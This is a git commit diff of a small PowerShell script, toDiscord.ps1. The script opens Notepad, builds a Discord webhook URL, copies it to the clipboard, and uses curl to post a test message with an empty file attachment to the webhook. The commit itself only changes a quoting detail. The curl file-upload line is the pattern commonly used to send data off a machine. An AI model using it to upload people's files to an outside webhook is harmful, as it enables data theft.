f9fad579e7dd8f9ecf5deacdb314ae81c3c48f22
SolidPiku <85856662+SolidPiku@users.noreply.github.com>
2024-11-05 11:07:35 -0600

    Update toDiscord.ps1

--- toDiscord.ps1
+++ toDiscord.ps1
@@ -2,6 +2,6 @@ Start-Process 'C:\windows\system32\notepad.exe'
 
 $wh = "https://discord.com/api/webhooks/$wh"
 
-Set-Clipboard -Value "$wh"
+Set-Clipboard -Value '$wh'
 
 curl.exe -F "payload_json={\`"username\`": \`"Tester\`", \`"content\`": \`"New test\`"}" -F "file=@\`"`"" $wh
